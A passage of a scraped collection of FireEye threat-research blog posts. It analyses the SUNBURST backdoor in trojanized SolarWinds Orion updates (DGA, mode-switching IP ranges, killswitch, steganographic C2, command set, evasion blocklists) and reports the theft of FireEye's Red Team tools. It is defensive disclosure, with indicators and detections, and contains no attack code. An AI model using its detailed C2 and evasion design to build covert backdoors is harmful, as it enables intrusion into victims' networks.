DGA subdomain encoding does not include victim machine domain name information. Instead, the DGA subdomains encode a timestamp or the list of stopped/running services. To transition back to “passive” mode, the malware operator may set the DNS server to resolve A records within the following IP ranges: 41.84.159.0/24 74.114.24.0/21 154.118.140.0/24 217.163.7.0/24 If the malware is transitioned from the “active” mode back to “passive”, the C2 coordinator must repeat the activation process if the operator wants to re-activate the sample. HTTP(S) C2 After receiving a CNAME DNS response with a new host to communicate with, SUNBURST starts a new thread to execute the method HttpHelper.Initialize . This method is responsible for the C2 communications and dispatching. The HTTP thread begins by delaying for a configurable amount of time that is controlled by the SetTime command. The HTTP thread delays for a minimum of one minute between callouts. The malware uses HTTP GET or POST requests. The sample disables certificate verification so it is possible to decrypt HTTPS traffic if SSL man-in-the-middle is performed. The malware constructs HTTP GET or POST request URIs from random selections of substrings. The scheme used depends on the A record received just prior to the CNAME DNS response. When sending a GET request, the malware adds an \"If-None-Match\" HTTP header that includes the encoded user ID. This likely allows the C2 server to determine which SUNBURST installation generated the request, further enabling multiplexing of C2 streams on a single server. In observed traffic, the C2 server employs steganography to hide data within HTTP response bodies and attempts to appear as benign XML related to .NET assemblies. Command data is spread across many GUID and hexadecimal strings. Commands are extracted from HTTP response bodies by searching for hexadecimal strings using the following regular expression: \"\\{[0-9a-f-]{36}\\}\"|\"[0-9a-f]{32}\"|\"[0-9a-f]{16}\" . Matched substrings in the response are filtered for non-hex characters, joined together, and hex-decoded. Depending on the mode of operation, the malware may skip the steganography and send the encoded response in an HTTP response body. Figure 2: C2 response embeds commands in XML GUIDs In the received C2 response, the first DWORD value indicates the actual size of the message. This value is followed immediately by the message with optional junk bytes added. The extracted message is single-byte XOR decoded using the first byte of the message. The result is then DEFLATE decompressed. The first character of the decompressed data is an ASCII integer that maps to a command ID, with optional additional command arguments delimited by space characters. The supported commands are shown in the following table. Command ID Operation Idle 0 No operation Exit 1 Terminate the current thread. SetTime 2 Sets the delay time between main event loop executions Delay is in seconds, and varies random between [.9 * <delay>, 1.1 * <delay>] If the delay is < 300 it is doubled on the next execution through the loop, this means it should settle onto an interval of around [5, 10] minutes o There is a second, unrelated delay routine that delays for a random interval between [16hrs, 83hrs] CollectSystemDescription 3 Profile the local system including hostname, username, OS version, MAC addresses, IP address, DHCP configuration, and domain information. UploadSystemDescription 4 Perform an HTTP request to the specified URL, parse the results and send the response to the C2 server. RunTask 5 Starts a new process with the given file path and arguments GetProcessByDescription 6 Returns a process listing. If no arguments are provided, returns just the PID and process name.  If an argument is provided, it also returns the parent PID and username and domain for the process owner. KillTask 7 Terminate the given process, by PID. GetFileSystemEntries 8 Given a path, and a match pattern recursively list files and directories. WriteFile 9 Given a file path and a Base64-encoded string write the contents of the Base64 string to the given file path. Write using append mode. Delay for [1s, 2s] after writing is done. FileExists 10 Tests whether the given file path exists. DeleteFile 11 Deletes the specified file path. GetFileHash 12 Compute the MD5 of a file at a given path and return the result as a hex string. If an argument is provided, it is the expected MD5 hash of the file and returns an error if the calculated MD5 differs. ReadRegistryValue 13 Arbitrary registry read from one of the supported hives. SetRegistryValue 14 Arbitrary registry write from one of the supported hives. DeleteRegistryValue 15 Arbitrary registry delete from one of the supported hives. GetRegistrySubKeyAndValueNames 16 Returns listing of subkeys and value names beneath the given registry path. Reboot 17 Attempts to immediately trigger a system reboot. SUNBURST sends messages back to the C2 server using a protocol that consists of UTF-8 strings and an appended 4-byte error DWORD and 8-byte userID. These are bare DEFLATE compressed and single-byte XOR encoded with the XOR key prepended to the message. Message payloads of length 10,000 or less are turned into JSON documents that resemble the Orion Improvement Program (OIP) messages used legitimately by SolarWinds. Messages larger than 10,000 bytes are sent as-is in the HTTP request body. The fake OIP document contains the following fields: userId – a unique identifier for the victim machine sessionID – stores a new random GUID for each HTTP thread steps – an array of objects that contain the following keys: Timestamp , Index , EventType , EventName , DurationMs , Succeeded , and Message . The JSON key EventType is hard-coded to the value Orion and the EventName is hard-coded to EventManager . The encoded message to send to the C2 server is split up into random ranges, Base64-encoded, and stored in the Message field of the objects in the steps array. Not all objects in the steps array contribute to the malware response. The integer in the Timestamp field must have the 0x2 bit set to indicate the contents of the Message field are used in the malware response. steps objects whose 0x2 bit is clear in the Timestamp field contain random data and are discarded when assembling the malware response. This may be an attempt to hinder analysis in the absence of the malware sample. Figure 3: HTTP callout masquerades as OIP protocol Modes of Operation As detailed in the DGA section, the malware has multiple modes of operation configured by the IP block that A records resolve to as well as depending on if CNAME records exist. These modes of operation are stored in internal enumerations. These mappings and values are described next. Internal Modes The following modes govern internal operations of the malware: Mode Name Value Description Truncate 3 Disabled; the malware killswitch has been activated and the sample may never run again without external modification to the XML configuration on-disk. New 4 Passive mode; DGA subdomains encode the system’s domain name Append 5 Active mode; C2 beaconing will occur on next CNAME resolve or is already actively occurring. DGA domains encode either the userID or the list of services The mode values are written into the backdoor configuration key ReportWatcherRetry . Investigators may consider recovering the malware configuration and inspecting this configuration value to determine the last running mode of the malware. The following transitions govern how IP block ranges are translated into running modes: Transition Name Description Atm Transition to Truncate Ipx Transition from Append to New ImpLink Transition to Truncate NetBios Transition to Append, either start or continue C2 beaconing Unknown Not an IPv4 or IPv6 address, exit and retry DGA later The following diagram describes how the SUNBURST’s DGA DNS responses act as mode transitions to control the malware before HTTP-based C2 beaconing has even begun: Additionally, here is an annotated network log showing how a sequence of DNS resolutions can transition the malware mode: To end this discussion of modes and transitions, a small note about the choices of these IP blocks. In cases such as the ImpLink IP blocks that activate the killswitch, it’s likely that the ranges were specifically chosen by the attacker to avoid being discovered by security researchers. In other cases, such as the NetBios and \"special\" NetBios IP blocks, the companies these blocks resolve to is likely irrelevant or at least beyond what can be definitively said without speculation. Malware Flow Diagram The following diagram provides a full picture of the malware's execution. Internally, SUNBURST uses a set of modes and transitions as described earlier. The names of these modes and transitions have no meaning. The malware authors purposely chose them as a form of obfuscation. When diagraming the malware's execution, these names were reused for clarity. Figure 4: Malware logic and decision states Q&A Is a system running blocklisted processes, services, or drivers safe from compromise? Sometimes, but not always. SUNBURST unconditionally exits if blocklisted processes or drivers are found and will not run until they are no longer detected. On the other hand, services are disabled by setting a registry value that controls startup initialization and are not explicitly stopped. As a result, a blocklisted service may still be running when the malware performs its service checks later. For this reason, it is possible for a victim system to be infected while a blocklisted service is running. Additionally, SUNBURST only attempts to disable a service once and updates its configuration to mark the service as disabled. Once the configuration is updated, the service is not treated as a blocklisted entry during subsequent execution. Does observing one DGA encoding over another provide any information during incident response? Short answer: it provides a hint for where to look but isn’t a be-all tell-all alone. Noticing the DGA encoding change in network logs is a hint that the malware may have moved from New to Append or Append to New. This puts the malware in a mode where if a CNAME record is seen soon after, then HTTP C2 can begin. Incident response should focus on trying to identify CNAME records being successfully resolved instead of focusing on DGA encodings entirely. Identifying CNAME records is easier than tracking the malware mode through logs and a stronger signal. What is the \"killswitch\"? FireEye discovered that certain DNS responses cause the malware to disable itself and stop further network activity. With the support and help of GoDaddy’s Abuse Team and the Microsoft Threat Intelligence Center, the domain used for resolving DGA domains was reconfigured to point to a sinkhole server under Microsoft’s control. The IP of this sinkhole server was specially chosen to fall into the range used by the malware to transition from its current mode (New or Append) into Truncate mode where it will be permanently inactive. In other words, SUNBURST infections should now be inoculated due to the killswitch. When C2 communication occurs, is a CNAME record required? CNAME records are required for HTTP C2 beaconing to occur and are provided by the C2 coordinator to specify the final C2 server. C2 activity must occur over a domain name provided via a CNAME record. It cannot occur directly via a raw IP. To initialize C2 beaconing, the backdoor first looks for an A record response from one of its special NetBios subnets and subsequently expects to receive a CNAME record. If a DGA domain is decoded to a company domain name, is that company compromised? When the backdoor is in “passive” mode it uses the DGA encoding which embeds victim AD domain names. This means that any system where the backdoor is present may have started trying to contact DNS servers where an attacker could then activate the backdoor to begin active C2 communications. In most cases this did not occur and backdoors for non-targets were disabled by the operator. Therefore, it cannot be assumed that an organization experienced follow-on activity if their domain is decoded from any DNS logs. Specifically, it’s only an indicator that the backdoor code was present and capable of being activated. Public Contributions We have seen substantial community contributions to our public SUNBURST GitHub repository . We would like to publicly thank all contributors to this repository. Specifically, all FNV hashes embedded within SUNBURST have been brute-forced. This is a huge amount of compute power that members of the community provided free-of-charge to help others. We want to thank everyone who contributed hashes and specifically callout the Hashcat community, which organized to systematically break each hash. This was essential for breaking the final few hashes whose preimage were of considerable length. Acknowledgements Matthew Williams, Michael Sikorski, Alex Berry and Robert Wallace. For additional information on UNC2452, register for our webinar, UNC2452: What We Know So Far , on Tuesday, Jan. 12, at 8 a.m. PT/11 a.m. ET. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-12-13",
                    "source": "www.fireeye.com"
                },
                "text": "Executive Summary We have discovered a global intrusion campaign. We are tracking the actors behind this campaign as UNC2452. FireEye discovered a supply chain attack trojanizing SolarWinds Orion business software updates in order to distribute malware we call SUNBURST. The attacker’s post compromise activity leverages multiple techniques to evade detection and obscure their activity, but these efforts also offer some opportunities for detection. The campaign is widespread, affecting public and private organizations around the world. FireEye is releasing signatures to detect this threat actor and supply chain attack in the wild. These are found on our public GitHub page . FireEye products and services can help customers detect and block this attack. Summary FireEye has uncovered a widespread campaign, that we are tracking as UNC2452. The actors behind this campaign gained access to numerous public and private organizations around the world. They gained access to victims via trojanized updates to SolarWind’s Orion IT monitoring and management software. This campaign may have begun as early as Spring 2020 and is currently ongoing. Post compromise activity following this supply chain compromise has included lateral movement and data theft. The campaign is the work of a highly skilled actor and the operation was conducted with significant operational security. SUNBURST Backdoor SolarWinds.Orion.Core.BusinessLayer.dll is a SolarWinds digitally-signed component of the Orion software framework that contains a backdoor that communicates via HTTP to third party servers. We are tracking the trojanized version of this SolarWinds Orion plug-in as SUNBURST. After an initial dormant period of up to two weeks, it retrieves and executes commands, called “Jobs”, that include the ability to transfer files, execute files, profile the system, reboot the machine, and disable system services. The malware masquerades its network traffic as the Orion Improvement Program (OIP) protocol and stores reconnaissance results within legitimate plugin configuration files allowing it to blend in with legitimate SolarWinds activity. The backdoor uses multiple obfuscated blocklists to identify forensic and anti-virus tools running as processes, services, and drivers. Figure 1: SolarWinds digital signature on software with backdoor Multiple trojanzied updates were digitally signed from March - May 2020 and posted to the SolarWinds updates website, including: hxxps://downloads.solarwinds[.]com/solarwinds/CatalogResources/Core/2019.4/2019.4.5220.20574/SolarWinds-Core-v2019.4.5220-Hotfix5.msp The trojanized update file is a standard Windows Installer Patch file that includes compressed resources associated with the update, including the trojanized SolarWinds.Orion.Core.BusinessLayer.dll component. Once the update is installed, the malicious DLL will be loaded by the legitimate SolarWinds.BusinessLayerHost.exe or SolarWinds.BusinessLayerHostx64.exe (depending on system configuration). After a dormant period of up to two weeks, the malware will attempt to resolve a subdomain of avsvmcloud[.]com. The DNS response will return a CNAME record that points to a Command and Control (C2) domain. The C2 traffic to the malicious domains is designed to mimic normal SolarWinds API communications. The list of known malicious infrastructure is available on FireEye’s GitHub page . Worldwide Victims Across Multiple Verticals FireEye has detected this activity at multiple entities worldwide. The victims have included government, consulting, technology, telecom and extractive entities in North America, Europe, Asia and the Middle East. We anticipate there are additional victims in other countries and verticals. FireEye has notified all entities we are aware of being affected. Post Compromise Activity and Detection Opportunities We are currently tracking the software supply chain compromise and related post intrusion activity as UNC2452. After gaining initial access, this group uses a variety of techniques to disguise their operations while they move laterally (Figure 2). This actor prefers to maintain a light malware footprint, instead preferring legitimate credentials and remote access for access into a victim’s environment. Figure 2: Post-compromise tactics This section will detail the notable techniques and outline potential opportunities for detection. TEARDROP and BEACON Malware Used Multiple SUNBURST samples have been recovered, delivering different payloads. In at least one instance the attackers deployed a previously unseen memory-only dropper we’ve dubbed TEARDROP to deploy Cobalt Strike BEACON. TEARDROP is a memory only dropper that runs as a service, spawns a thread and reads from the file “gracious_truth.jpg”, which likely has a fake JPG header. Next it checks that HKU\\SOFTWARE\\Microsoft\\CTF exists, decodes an embedded payload using a custom rolling XOR algorithm and manually loads into memory an embedded payload using a custom PE-like file format. TEARDROP does not have code overlap with any previously seen malware. We believe that this was used to execute a customized Cobalt Strike BEACON. Mitigation : FireEye has provided two Yara rules to detect TEARDROP available on our GitHub . Defenders should look for the following alerts from FireEye HX: MalwareGuard and WindowsDefender: Process Information file_operation_closed file-path*: “c:\\\\windows\\\\syswow64\\\\netsetupsvc.dll actor-process: pid: 17900 Window’s defender Exploit Guard log entries: (Microsoft-Windows-Security-Mitigations/KernelMode event ID 12) Process”\\Device\\HarddiskVolume2\\Windows\\System32\\svchost.exe” (PID XXXXX) would have been blocked from loading the non-Microsoft-signed binary ‘\\Windows\\SysWOW64\\NetSetupSvc.dll’ Attacker Hostnames Match Victim Environment The actor sets the hostnames on their command and control infrastructure to match a legitimate hostname found within the victim’s environment. This allows the adversary to blend into the environment, avoid suspicion, and evade detection. Detection Opportunity The attacker infrastructure leaks its configured hostname in RDP SSL certificates, which is identifiable in internet-wide scan data. This presents a detection opportunity for defenders -- querying internet-wide scan data sources for an organization’s hostnames can uncover malicious IP addresses that may be masquerading as the organization. (Note: IP Scan history often shows IPs switching between default (WIN-*) hostnames and victim’s hostnames) Cross-referencing the list of IPs identified in internet scan data with remote access logs may identify evidence of this actor in an environment. There is likely to be a single account per IP address. IP Addresses located in Victim’s Country The attacker’s choice of IP addresses was also optimized to evade detection. The attacker primarily used only IP addresses originating from the same country as the victim, leveraging Virtual Private Servers. Detection Opportunity This also presents some detection opportunities, as geolocating IP addresses used for remote access may show an impossible rate of travel if a compromised account is being used by the legitimate user and the attacker from disparate IP addresses. The attacker used multiple IP addresses per VPS provider, so once a malicious login from an unusual ASN is identified, looking at all logins from that ASN can help detect additional malicious activity. This can be done alongside baselining and normalization of ASN’s used for legitimate remote access to help identify suspicious activity. Lateral Movement Using Different Credentials Once the attacker gained access to the network with compromised credentials, they moved laterally using multiple different credentials. The credentials used for lateral movement were always different from those used for remote access. Detection Opportunity Organizations can use HX’s LogonTracker module to graph all logon activity and analyze systems displaying a one-to-many relationship between source systems and accounts. This will uncover any single system authenticating to multiple systems with multiple accounts, a relatively uncommon occurrence during normal business operations. Temporary File Replacement and Temporary Task Modification The attacker used a temporary file replacement technique to remotely execute utilities: they replaced a legitimate utility with theirs, executed their payload, and then restored the legitimate original file. They similarly manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returning the scheduled task to its original configuration. They routinely removed their tools, including removing backdoors once legitimate remote access was achieved. Detection Opportunity Defenders can examine logs for SMB sessions that show access to legitimate directories and follow a delete-create-execute-delete-create pattern in a short amount of time. Additionally, defenders can monitor existing scheduled tasks for temporary updates, using frequency analysis to identify anomalous modification of tasks. Tasks can also be monitored to watch for legitimate Windows tasks executing new or unknown binaries. This campaign’s post compromise activity was conducted with a high regard for operational security, in many cases leveraging dedicated infrastructure per intrusion. This is some of the best operational security that FireEye has observed in a cyber attack, focusing on evasion and leveraging inherent trust. However, it can be detected through persistent defense. In-Depth Malware Analysis SolarWinds.Orion.Core.BusinessLayer.dll (b91ce2fa41029f6955bff20079468448) is a SolarWinds-signed plugin component of the Orion software framework that contains an obfuscated backdoor which communicates via HTTP to third party servers. After an initial dormant period of up to two weeks, it retrieves and executes commands, called “Jobs”, that include the ability to transfer and execute files, profile the system, and disable system services. The backdoor’s behavior and network protocol blend in with legitimate SolarWinds activity, such as by masquerading as the Orion Improvement Program (OIP) protocol and storing reconnaissance results within plugin configuration files. The backdoor uses multiple blocklists to identify forensic and anti-virus tools via processes, services, and drivers. Unique Capabilities Subdomain DomainName Generation Algorithm (DGA) is performed to vary DNS requests CNAME responses point to the C2 domain for the malware to connect to The IP block of A record responses controls malware behavior DGA encoded machine domain name, used to selectively target victims Command and control traffic masquerades as the legitimate Orion Improvement Program Code hides in plain site by using fake variable names and tying into legitimate components Delivery and Installation Authorized system administrators fetch and install updates to SolarWinds Orion via packages distributed by SolarWinds’s website. The update package CORE-2019.4.5220.20574-SolarWinds-Core-v2019.4.5220-Hotfix5.msp (02af7cec58b9a5da1c542b5a32151ba1) contains the SolarWinds.Orion.Core.BusinessLayer.dll described in this report. After installation, the Orion software framework executes the .NET program SolarWinds.BusinessLayerHost.exe to load plugins, including SolarWinds.Orion.Core.BusinessLayer.dll. This plugin contains many legitimate namespaces, classes, and routines that implement functionality within the Orion framework. Hidden in plain sight, the class SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer implements an HTTP-based backdoor. Code within the logically unrelated routine SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager.RefreshInternal invokes the backdoor code when the Inventory Manager plugin is loaded. SolarWinds.Orion.Core.BusinessLayer.dll is signed by SolarWinds, using the certificate with serial number 0f:e9:73:75:20:22:a6:06:ad:f2:a3:6e:34:5d:c0:ed. The file was signed on March 24, 2020. Initialization On execution of the malicious SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer.Initialize method the sample verifies that its lower case process name hashes to the value 17291806236368054941. This hash value is calculated as the standard FNV-1A 64-bit hash with an additional XOR by 6605813339339102567 after computing the FNV-1A. This hash matches a process named \"solarwinds.businesslayerhost\". The sample only executes if the filesystem write time of the assembly is at least 12 to 14 days prior to the current time; the exact threshold is selected randomly from an interval. The sample continues to check this time threshold as it is run by a legitimate recurring background task. Once the threshold is met, the sample creates the named pipe 583da945-62af-10e8-4902-a8f205c72b2e to act as a guard that only one instance is running before reading SolarWinds.Orion.Core.BusinessLayer.dll.config from disk and retrieving the XML field appSettings. The appSettings fields’ keys are legitimate values that the malicious logic re-purposes as a persistent configuration. The key ReportWatcherRetry must be any value other than 3 for the sample to continue execution. The sample checks that the machine is domain joined and retrieves the domain name before execution continues. A userID is generated by computing the MD5 of a network interface MAC address that is up and not a loopback device, the domain name, and the registry value HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid. The userID is encoded via a custom XOR scheme after the MD5 is calculated. The ReportWatcherPostpone key of appSettings is then read from SolarWinds.Orion.Core.BusinessLayer.dll.config to retrieve the initial, legitimate value. This operation is performed as the sample later bit packs flags into this field and the initial value must be known in order to read out the bit flags. The sample then invokes the method Update which is the core event loop of the sample. DGA and Blocklists The backdoor determines its C2 server using a Domain Generation Algorithm (DGA) to construct and resolve a subdomain of avsvmcloud[.]com. The Update method is responsible for initializing cryptographic helpers for the generation of these random C2 subdomains. Subdomains are generated by concatenating a victim userId with a reversible encoding of the victims local machine domain name. The attacker likely utilizes the DGA subdomain to vary the DNS response to victims as a means to control the targeting of the malware. These subdomains are concatenated with one of the following to create the hostname to resolve: .appsync-api.eu-west-1[.]avsvmcloud[.]com .appsync-api.us-west-2[.]avsvmcloud[.]com .appsync-api.us-east-1[.]avsvmcloud[.]com .appsync-api.us-east-2[.]avsvmcloud[.]com Process name, service name, and driver path listings are obtained, and each value is hashed via the FNV-1a + XOR algorithm as described previously and checked against hardcoded blocklists. Some of these hashes have been brute force reversed as part of this analysis, showing that these routines are scanning for analysis tools and antivirus engine components. If a blocklisted process is found the Update routine exits and the sample will continue to try executing the routine until the blocklist passes. Blocklisted services are stopped by setting their HKLM\\SYSTEM\\CurrentControlSet\\services\\<service_name>\\Start registry entries to value 4 for disabled. Some entries in the service list if found on the system may affect the DGA algorithms behavior in terms of the values generated. The list of stopped services is then bit-packed into the ReportWatcherPostpone key of the appSettings entry for the samples’ config file. If any service was transitioned to disabled the Update method exits and retries later. The sample retrieves a driver listing via the WMI query Select * From Win32_SystemDriver. If any blocklisted driver is seen the Update method exits and retries. If all blocklist tests pass, the sample tries to resolve api.solarwinds.com to test the network for connectivity. Network Command and Control (C2) If all blocklist and connectivity checks pass, the sample starts generating domains in a while loop via its DGA. The sample will delay for random intervals between the generation of domains; this interval may be any random value from the ranges 1 to 3 minutes, 30 to 120 minutes, or on error conditions up to 420 to 540 minutes (9 hours). The DNS A record of generated domains is checked against a hardcoded list of IP address blocks which control the malware’s behavior. Records within the following ranges will terminate the malware and update the configuration key ReportWatcherRetry to a value that prevents further execution: 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 224.0.0.0/3 fc00:: - fe00:: fec0:: - ffc0:: ff00:: - ff00:: 20.140.0.0/15 96.31.172.0/24 131.228.12.0/22 144.86.226.0/24 Once a domain has been successfully retrieved in a CNAME DNS response the sample will spawn a new thread of execution invoking the method HttpHelper.Initialize which is responsible for all C2 communications and dispatching. The HTTP thread begins by delaying for a configurable amount of time that is controlled by the SetTime command. The HTTP thread will delay for a minimum of 1 minute between callouts. The malware uses HTTP GET or HTTP POST requests. If the sample is attempting to send outbound data the content-type HTTP header will be set to \"application/octet-stream\" otherwise to \"application/json\". A JSON payload is present for all HTTP POST and PUT requests and contains the keys “userId”, “sessionId”, and “steps”. The “steps” field contains a list of objects with the following keys: “Timestamp”, “Index”, “EventType”, “EventName”, “DurationMs”, “Succeeded”, and “Message”. The JSON key “EventType” is hardcoded to the value “Orion”, and the “EventName” is hardcoded to “EventManager”. Malware response messages to send to the server are DEFLATE compressed and single-byte-XOR encoded, then split among the “Message” fields in the “steps” array. Each “Message” value is Base64 encoded separately. Not all objects in the “steps” array contribute to the malware message – the integer in the “Timestamp” field must have the 0x2 bit set to indicate that the contents of the “Message” field are used in the malware message. Step objects whose bit 0x2 is clear in the Timestamp field contain random data and are discarded when assembling the malware response. Steganography In observed traffic these HTTP response bodies attempt to appear like benign XML related to .NET assemblies, but command data is actually spread across the many GUID and HEX strings present. Commands are extracted from HTTP response bodies by searching for HEX strings using the following regular expression: \"\\{[0-9a-f-]{36}\\}\"|\"[0-9a-f]{32}\"|\"[0-9a-f]{16}\". Command data is spread across multiple strings that are disguised as GUID and HEX strings. All matched substrings in the response are filtered for non HEX characters, joined together, and HEX-decoded. The first DWORD value shows the actual size of the message, followed immediately with the message, with optional additional junk bytes following. The extracted message is single-byte XOR decoded using the first byte of the message, and this is then DEFLATE decompressed. The first character is an ASCII integer that maps to the JobEngine enum, with optional additional command arguments delimited by space characters. Commands are then dispatched to a JobExecutionEngine based upon the command value as described next. Supported Commands Command Value Operation Idle 0 No operation Exit 1 Terminate the current thread. SetTime 2 Sets the delay time between main event loop executions Delay is in seconds, and varies random between [.9 * <delay>, 1.1 * <delay>].          If the delay is < 300 it is doubled on the next execution through the loop, this means it should settle onto an interval of around [5, 10] minutes.         There is a second, unrelated delay routine that delays for a random interval between [16hrs, 83hrs] CollectSystemDescription 3 Profile the local system including hostname, username, OS version, MAC addresses, IP address, DHCP configuration, and domain information. UploadSystemDescription 4 Perform a HTTP request to the specified URL, parse the results and compare components against unknown hashed values. Format a report and send to the C2 server. RunTask 5 Starts a new process with the given file path and arguments GetProcessByDescription 6 Returns a process listing. If no arguments are provided returns just the PID and process name.        If an argument is provided it also returns the parent PID and username and domain for the process owner. KillTask 7 Terminate the given process, by PID. GetFileSystemEntries 8 Given a path and an optional match pattern recursively list files and directories WriteFile 9 Given a file path and a Base64 encoded string write the contents of the Base64 decoded string to the given file path. Write using append mode. Delay for [1s, 2s] after writing is done. FileExists 10 Tests whether the given file path exists. DeleteFile 11 Deletes the specified file path. GetFileHash 12 Compute the MD5 of a file at a given path and return result as a HEX string. If an argument is provided, it is the expected MD5 hash of the file and returns an error if the calculated MD5 differs. ReadRegistryValue 13 Arbitrary registry read from one of the supported hives SetRegistryValue 14 Arbitrary registry write from one of the supported hives. DeleteRegistryValue 15 Arbitrary registry delete from one of the supported hives GetRegistrySubKeyAndValueNames 16 Returns listing of subkeys and value names beneath the given registry path Reboot 17 Attempts to immediately trigger a system reboot. Indicators and Detections to Help the Community To empower the community to detect this supply chain backdoor, we are publishing indicators and detections to help organizations identify this backdoor and this threat actor. The signatures are a mix of Yara, IOC, and Snort formats. A list of the detections and signatures are available on the FireEye GitHub repository found here . We are releasing detections and will continue to update the public repository with overlapping detections for host and network-based indicators as we develop new or refine existing ones. We have found multiple hashes with this backdoor and we will post updates of those hashes. MITRE ATT&CK Techniques Observed ID Description T1012 Query Registry T1027 Obfuscated Files or Information T1057 Process Discovery T1070.004 File Deletion T1071.001 Web Protocols T1071.004 Application Layer Protocol: DNS T1083 File and Directory Discovery T1105 Ingress Tool Transfer T1132.001 Standard Encoding T1195.002 Compromise Software Supply Chain T1518 Software Discovery T1518.001 Security Software Discovery T1543.003 Windows Service T1553.002 Code Signing T1568.002 Domain Generation Algorithms T1569.002 Service Execution T1584 Compromise Infrastructure Immediate Mitigation Recommendations Prior to following SolarWind’s recommendation to utilize Orion Platform release 2020.2.1 HF 1, which is currently available via the SolarWinds Customer Portal, organizations should consider preserving impacted devices and building new systems using the latest versions. Applying an upgrade to an impacted box could potentially overwrite forensic evidence as well as leave any additional backdoors on the system. In addition, SolarWinds has released additional mitigation and hardening instructions here . In the event you are unable to follow SolarWinds’ recommendations, the following are immediate mitigation techniques that could be deployed as first steps to address the risk of trojanized SolarWinds software in an environment. If attacker activity is discovered in an environment, we recommend conducting a comprehensive investigation and designing and executing a remediation strategy driven by the investigative findings and details of the impacted environment. Ensure that SolarWinds servers are isolated / contained until a further review and investigation is conducted. This should include blocking all Internet egress from SolarWinds servers. If SolarWinds infrastructure is not isolated, consider taking the following steps: Restrict scope of connectivity to endpoints from SolarWinds servers, especially those that would be considered Tier 0 / crown jewel assets Restrict the scope of accounts that have local administrator privileged on SolarWinds servers. Block Internet egress from servers or other endpoints with SolarWinds software. Consider (at a minimum) changing passwords for accounts that have access to SolarWinds servers / infrastructure. Based upon further review / investigation, additional remediation measures may be required. If SolarWinds is used to managed networking infrastructure, consider conducting a review of network device configurations for unexpected / unauthorized modifications. Note, this is a proactive measure due to the scope of SolarWinds functionality, not based on investigative findings. Acknowledgements This blog post was the combined effort of numerous personnel and teams across FireEye coming together. Special thanks to: Andrew Archer, Doug Bienstock, Chris DiGiamo, Glenn Edwards, Nick Hornick, Alex Pennino, Andrew Rector, Scott Runnels, Eric Scales, Nalani Fraser, Sarah Jones, John Hultquist, Ben Read, Jon Leathery, Fred House, Dileep Jallepalli, Michael Sikorski, Stephen Eckels, William Ballenthin, Jay Smith, Alex Berry, Nick Richard, Isif Ibrahima, Dan Perez, Marcin Siedlarz, Ben Withnell, Barry Vengerik, Nicole Oppenheim, Ian Ahl, Andrew Thompson, Matt Dunwoody, Evan Reese, Steve Miller, Alyssa Rahman, John Gorman, Lennard Galang, Steve Stone, Nick Bennett, Matthew McWhirt, Mike Burns, Omer Baig. Also special thanks to Nick Carr, Christopher Glyer, and Ramin Nafisi from Microsoft. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/12/unauthorized-access-of-fireeye-red-team-tools.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-12-08",
                    "source": "www.fireeye.com"
                },
                "text": "Overview A highly sophisticated state-sponsored adversary stole FireEye Red Team tools. Because we believe that an adversary possesses these tools, and we do not know whether the attacker intends to use the stolen tools themselves or publicly disclose them, FireEye is releasing hundreds of countermeasures with this blog post to enable the broader security community to protect themselves against these tools. We have incorporated the countermeasures in our FireEye products—and shared these countermeasures with partners, government agencies—to significantly limit the ability of the bad actor to exploit the Red Team tools. You can find a list of the countermeasures on the FireEye GitHub repository found HERE . Red Team Tools and Techniques A Red Team is a group of security professionals authorized and organized to mimic a potential adversary’s attack or exploitation capabilities against an enterprise’s security posture. Our Red Team’s objective is to improve enterprise cyber security by demonstrating the impacts of successful attacks and by showing the defenders (i.e., the Blue Team) how to counter them in an operational environment. We have been performing Red Team assessments for customers around the world for over 15 years. In that time, we have built up a set of scripts, tools, scanners, and techniques to help improve our clients’ security postures. Unfortunately, these tools were stolen by a highly sophisticated attacker. The stolen tools range from simple scripts used for automating reconnaissance to entire frameworks that are similar to publicly available technologies such as CobaltStrike and Metasploit. Many of the Red Team tools have already been released to the community and are already distributed in our open-source virtual machine, CommandoVM . Some of the tools are publicly available tools modified to evade basic security detection mechanisms. Other tools and frameworks were developed in-house for our Red Team. No Zero-Day Exploits or Unknown Techniques The Red Team tools stolen by the attacker did not contain zero-day exploits. The tools apply well-known and documented methods that are used by other red teams around the world. Although we do not believe that this theft will greatly advance the attacker’s overall capabilities, FireEye is doing everything it can to prevent such a scenario. It’s important to note that FireEye has not seen these tools disseminated or used by any adversaries, and we will continue to monitor for any such activity along with our security partners. Detections to Help the Community To empower the community to detect these tools, we are publishing countermeasures to help organizations identify these tools if they appear in the wild. In response to the theft of our Red Team tools, we have released hundreds of countermeasures for publicly available technologies like OpenIOC, Yara, Snort, and ClamAV. A list of the countermeasure is available on the FireEye GitHub repository found here . We are releasing detections and will continue to update the public repository with overlapping countermeasures for host, network, and file-based indicators as we develop new or refine existing detections. In addition, we are publishing a list of CVEs that need to be addressed to limit the effectiveness of the Red Team tools on the GitHub page. FireEye Products Protect Customers Against These Tools Teams across FireEye have worked to build the countermeasures to protect our customers and the broader community. We have incorporated these countermeasures into our products and shared these countermeasures with our partners, including the Department of Homeland Security, who have incorporated the countermeasures into their products to provide broad coverage for the community. More information on the detection signatures available can be found in the GitHub repository . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/12/using-speakeasy-emulation-framework-programmatically-to-unpack-malware.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-12-01",
                    "source": "www.fireeye.com"
                },
